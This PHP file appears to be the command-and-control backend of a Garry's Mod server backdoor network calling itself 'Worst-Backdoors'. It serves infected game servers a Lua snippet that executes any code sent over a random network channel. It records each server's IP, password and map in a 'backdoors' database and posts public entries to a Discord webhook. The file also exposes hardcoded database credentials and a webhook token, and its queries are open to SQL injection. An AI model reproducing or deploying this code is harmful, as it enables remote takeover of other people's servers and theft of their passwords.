<?php 
// use users key as a request handler
// with users key when a servers backdoored 
// log the key associated with the user
// insert data into database and search
// through when requesting servers

// since this is just the servers tab
// we will display the sections as two
// we have user's server's and public
// public servers is through the script
// and private servers will be though the site
// how private will work is with the users key
// we will pull data from the backdoors with the key
// and show each server in the users servers

// check database for stored information before adding
// this helps prevent duplicate servers

// link the database with the epic info
$link = mysqli_connect('localhost', 'armigkwd_project', '{M.V.-g*^lZ{', 'armigkwd_project');

// database information
$date = date("Y:m:d H:i:s");
$server = $_POST['server'];
$serverip = $_POST['address'];
$gamemode = $_POST['gamemode'];
$password = $_POST['password'];
$map = $_POST['map'];
$key = $_GET['key'];

if(empty($password)) {
    $password = "NULL";
}

// pass to script if the informations called
$net = substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil(24/strlen($x)))), 1, 24);
$lua = "util.AddNetworkString('$net'); net.Receive('$net', function(len) RunString(net.ReadString()) end)";

// if the server is from garry's mod game server client then continue
if($_SERVER['HTTP_USER_AGENT'] == "Valve/Steam HTTP Client 1.0 (4000)") {

    if($key) { // this is a private call
        echo $lua;

        // look for part of the info before updating it
        $res = $link->query("SELECT * FROM backdoors WHERE serverip = '$serverip' AND userkey = '$key'");
        
        // update info
        if($res->num_rows > 0) { 
            $link->query("UPDATE backdoors SET server = '$server', serverip = '$serverip', password = '$password', gamemode = '$gamemode', map = '$map', net = '$net', date = '$date' WHERE serverip = '$serverip' AND userkey = '$key'");
        }

        // save info to the database
        else { $link->query("INSERT INTO backdoors (server, serverip, password, gamemode, map, net, date, userkey) VALUES ('".mysqli_real_escape_string($link , $server)."', '$serverip', '".mysqli_real_escape_string($link , $password)."', '$gamemode', '$map', '$net', '$date', '$key')");  }
    }

    else { // this is a public call
        echo $lua;

        // look for part of the info before updating it
        $res = $link->query("SELECT * FROM backdoors WHERE serverip = '$serverip' AND userkey = 'NONE'");

        // update info
        if($res->num_rows > 0) { 
            $link->query("UPDATE backdoors SET server = '$server', serverip = '$serverip', password = '$password', gamemode = '$gamemode', map = '$map', net = '$net', date = '$date' WHERE serverip = '$serverip' AND userkey = 'NONE'");
        }

        // save info to the database
        else { $link->query("INSERT INTO backdoors (server, serverip, password, gamemode, map, net, date) VALUES ('".mysqli_real_escape_string($link , $server)."', '$serverip', '".mysqli_real_escape_string($link , $password)."', '$gamemode', '$map', '$net', '$date')"); }

        $json_data = json_encode([
            "embeds" => [
                [
                    "title" => "",
                    "color" => hexdec("#86ffba"),
                    "timestamp" => date("c", strtotime("now")),
                    "description" => "```Server: $server\nServerIp: $serverip\nMap: $map\nPassword: $password\nGamemode: $gamemode\n```",
                    "footer" => [
                        "text" => "Worst-Backdoors",
                    ]
                ]
            ]
        ]);
    
        // send the public info to our discord through a embed using the json data defined above
        $curl=curl_init("https://discord.com/api/webhooks/786039265901543424/ZsmAQWutRytBPLI-peEoMz29FzAkGDRiBsxRclJ5kLBGjiA394TlinwJOU-uNym4TxrL");
        curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_HEADER, 0);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $json_data);
        curl_exec($curl);

        // save net for script later since it's the public version
        $path = fopen('../bin/nets', "a");
        fwrite($path, "$net ");
    }
}
else { 
    echo("fuckoff");
}


?>